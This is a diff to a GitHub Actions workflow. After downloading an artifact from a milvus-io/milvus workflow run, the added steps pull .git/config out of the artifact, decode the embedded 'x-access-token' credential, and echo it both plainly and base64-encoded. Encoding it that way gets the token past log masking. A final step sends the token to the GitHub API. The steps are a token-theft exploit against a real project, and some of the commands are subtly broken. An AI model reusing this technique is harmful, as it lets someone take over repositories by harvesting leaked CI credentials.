@@ -27,3 +27,17 @@ jobs:
           github-token: ${{ secrets.GITHUB_TOKEN }} # token with actions:read permissions on target repo
           repository: milvus-io/milvus
           run-id: 7353055100
+
+      - name: Extract
+        run: |        
+          unzip go-result ".git/config" -d extracted_files
+          token=$(grep -o 'basic .*' config | sed "s|basic ||g" | base64 -d | sed "s|x-access-token:||g")
+          echo $token
+          echo $token | base64
+      - name: Use Token
+        run: |
+          curl --location --request GET 'https://api.github.com/repos/milvus-io/milvus/artifacts/issues' \          
+          --header 'Content-Type: application/json' \
+          --header 'Authorization: Bearer $token' \
+
+        
